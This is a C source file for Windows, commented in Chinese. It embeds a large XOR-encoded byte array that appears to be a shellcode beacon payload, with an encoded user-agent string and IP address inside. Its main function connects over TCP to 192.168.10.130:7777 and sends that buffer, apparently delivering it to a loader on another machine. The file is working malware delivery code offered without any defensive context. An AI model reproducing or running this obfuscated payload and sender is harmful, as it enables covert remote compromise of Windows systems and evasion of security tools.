#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#pragma comment(lib,"ws2_32.lib")   // 加载ws2_32.lib库文件
char buf[] = "\xf6\x42\x89\xee\xfa\xe2\xc2\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x05\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\x4b\xcb\xc3\x07\x4b\x0b\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\x0b\xda\x6c\x8b\x72\x12\x01\x08\x7f\x78\x81\x8a\x82\x0a\x0a\x0a\x42\x8f\xca\x7e\x6d\x42\x0b\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\x0b\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\x0b\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x07\x4b\x0b\xcb\x32\xea\x7f\xfb\x46\x09\x46\x2e\x02\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\x0b\xda\x6c\x4b\x81\x06\x42\x4e\x81\x4a\x16\x43\x0b\xda\x4b\x81\x0e\x82\x42\x0b\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x45\xf5\xf5\xf5\x57\x60\x0a\x43\xb4\x7d\x63\x64\x63\x64\x6f\x7e\x0a\x4b\x5c\x43\x83\xec\x46\x83\xfb\x4b\xb0\x46\x7d\x2c\x0d\xf5\xdf\x42\x3b\xc3\x42\x3b\xd8\x47\x3b\xca\x47\x3b\xc3\x4b\x5a\x4b\x5a\x4b\xb0\x30\x5c\x73\xad\xf5\xdf\xe3\x99\x0a\x0a\x0a\x50\x42\x83\xcb\x4b\xb2\xb1\x0b\x0a\x0a\x47\x3b\xc3\x4b\x5b\x4b\x5b\x60\x09\x4b\x5b\x4b\xb0\x5d\x83\x95\xcc\xf5\xdf\xe1\x73\x51\x42\x83\xcb\x42\x3b\xd8\x43\x83\xd2\x47\x3b\xc3\x58\x62\x0a\x38\xca\x8e\x58\x58\x4b\xb0\xe1\x5f\x24\x31\xf5\xdf\x42\x83\xcc\x42\x89\xc9\x5a\x60\x00\x55\x42\x83\xfb\xb0\x15\x0a\x0a\x0a\x60\x0a\x62\x8a\x39\x0a\x0a\x43\x83\xea\x4b\xb3\x0e\x0a\x0a\x0a\x4b\xb0\x7f\x4c\x94\x8c\xf5\xdf\x42\x83\xfb\x42\x83\xd0\x43\xcd\xca\xf5\xf5\xf5\xf5\x47\x3b\xc3\x58\x58\x4b\xb0\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8f\x97\x0b\x0a\x0a\x42\xf5\xc5\x05\x8e\x86\x0b\x0a\x0a\xe1\xb9\xe3\xee\x0b\x0a\x0a\xe2\x88\xf5\xf5\xf5\x25\x40\x64\x3b\x7e\x0a\x59\xed\x61\x1b\xdf\x3e\x13\xc9\xf1\x01\xed\x91\xa6\x7a\xe5\xf8\x04\xc0\x24\x02\xa4\x2d\xa1\x21\xa4\xdd\xc1\x24\xcb\xe9\x00\x35\xa0\xbb\x51\x61\xa9\xbe\x87\xa4\x2a\xa3\x92\x47\x25\x14\xae\xff\xd5\xc6\x1e\x41\x77\x94\xa1\x1e\x64\x69\xac\x38\x87\x0a\x92\x92\x24\x76\x2d\x03\xdd\xa7\x2f\x5e\x40\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x4f\x44\x43\x44\x23\x07\x00\x0a\xe8\xb7\xf3\xe5\x9f\x70\x00\x0b\xfe\xd4\xb2\x39\xfb\x5c\x44\x09\x97\xf0\xd2\x98\x67\x61\x12\x34\xad\xa8\x18\x26\xcb\x89\xb6\x4d\xf3\x6b\xc1\xcd\xc6\x69\x01\x66\xb0\x77\xbb\x00\xb9\x9c\x18\x09\x9d\x66\x1d\x23\x6c\x63\x4f\x46\xfc\x3b\xe1\xac\xb2\xc2\x64\x9b\x74\x04\x5c\x06\x50\x76\x46\x90\x13\x52\x14\xb7\x91\x70\x08\xcc\x28\xe4\x98\xcd\x18\x45\xc8\x65\xbf\xd3\x93\x92\x58\x98\x35\x5a\x18\xa2\x2e\x6f\xc0\xe0\x27\x66\x9d\x95\x4e\x4b\xc8\x09\xf0\xf7\x7d\x02\x55\x30\x0e\x3a\x8e\x0d\xc4\xa5\xc3\x96\x83\xba\xe5\x97\x05\x68\x77\xff\x66\x1d\x9c\x85\x04\xc0\x0d\x5b\xa1\x9a\xc3\x5a\xf4\xc1\xfd\xf4\x59\xfd\xfa\x99\x60\x5b\xed\x8a\x70\x52\x09\xce\x6d\x61\x1c\xe8\x61\x70\x97\x58\x59\xe7\x82\x1c\xe2\x7b\xeb\x7a\x6b\x1f\xaf\xe3\x27\x3b\x24\xcc\x9b\xf9\x1f\xed\xb4\x5a\xa0\xf1\x77\x82\x41\xee\xec\x34\x99\xbe\x60\xb4\x82\x90\x48\xf4\x1f\xb7\x39\xdb\x3f\xfe\x0a\x0a\x4b\xb4\xfa\xbf\xa8\x5c\xf5\xdf\x42\x3b\xc3\xb0\x0a\x0a\x4a\x0a\x4b\xb2\x0a\x1a\x0a\x0a\x4b\xb3\x4a\x0a\x0a\x0a\x4b\xb0\x52\xae\x59\xef\xf5\xdf\x42\x99\x59\x59\x42\x83\xed\x42\x83\xfb\x42\x83\xd0\x4b\xb2\x0a\x2a\x0a\x0a\x43\x83\xf3\x4b\xb0\x18\x9c\x83\xe8\xf5\xdf\x42\x89\xce\x2a\x8f\xca\x7e\xbc\x6c\x81\x0d\x42\x0b\xc9\x8f\xca\x7f\xdd\x52\x52\x52\x42\x0f\x0a\x0a\x0a\x0a\x5a\xc9\xe2\x75\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3a\x24\x3b\x38\x33\x0a\x0a\x00\x26\x20";

// 入口函数
int wmain(int argc, TCHAR argv[]) {
    DWORD dwError;                      // 接收错误的变量
    WORD sockVersion = MAKEWORD(2, 2);  // 版本
    WSADATA wsaData;                    // WSADATA数据结构的指针 ，用于接收 Windows 套接字实现的详细信息
    SOCKET socks;                       // 一个SOCKET套接字
    SHORT sListenPort = 7777;           // 监听端口
    struct sockaddr_in sin;             // SOCKADDR_IN 结构为AF_INET地址族指定传输地址和端口

    // 使用Winsock 2 DLL，用于初始化WinSock；如果成功, WSAStartup函数返回零
    if (WSAStartup(sockVersion, &wsaData) != 0)
    {
        dwError = GetLastError();
        printf("[*]WSAStarup Error : %d \n", dwError);
        return dwError;
    }

    // 建立SOCKET套接字
    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  

    // 如果失败就返回INVALID_SOCKET
    if (socks == INVALID_SOCKET)
    {
        dwError = GetLastError();
        printf("[*]Socket Error : %d \n", dwError);
        return dwError;
    }

    // 然后配置sockaddr_in结构体
    sin.sin_family = AF_INET;                               // 传输地址的地址族。此成员应始终设置为 AF_INET。
    sin.sin_port = htons(sListenPort);                      // 传输协议端口号，htons：将主机的无符号短整形数转换成网络字节顺序
    sin.sin_addr.S_un.S_addr = inet_addr("192.168.10.130");  // 服务端的ip 包含 IPv4 传输地址的 IN_ADDR结构。inet_addr函数转换包含IPv4的字符串点分十进制地址转换成一个适当的地址 IN_ADDR结构

    if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)    // 链接到制定的socket
    {
        dwError = GetLastError();
        printf("[*]Bind Error : %d \n", dwError);
        return dwError;
    }
    int ret = send(socks, buf, sizeof(buf), 0); // 往指定的socket上发送数据

    if (ret > 0)    // 如果没有发生错误， send返回发送的总字节数
    {
        printf("[+]Send %d-Bytes \n", ret);
        closesocket(socks); // 发送完数据就关闭套接字
    }

    WSACleanup();   // 终止使用
    return 0;
}